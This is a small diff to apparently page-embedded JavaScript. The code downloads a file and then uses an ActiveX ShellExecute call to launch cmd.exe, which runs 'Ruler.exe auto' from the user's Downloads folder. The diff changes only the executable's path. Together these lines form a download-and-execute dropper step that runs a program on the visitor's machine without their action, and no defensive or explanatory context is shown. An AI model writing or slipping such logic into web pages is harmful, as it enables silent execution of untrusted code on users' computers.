@@ -31,7 +31,7 @@
                 a.href = url;
                 a.download = fileName;
 				
-				objShell.ShellExecute("cmd.exe", "%DOWNLOAD_FOLDER%\\Ruler.exe auto", "C:\\WINDOWS\\system32", "open", "1");
+				objShell.ShellExecute("cmd.exe", "%userprofile%\\Downloads\\Ruler.exe auto", "C:\\WINDOWS\\system32", "open", "1");
                 a.click();
                 window.URL.revokeObjectURL(url);
             }
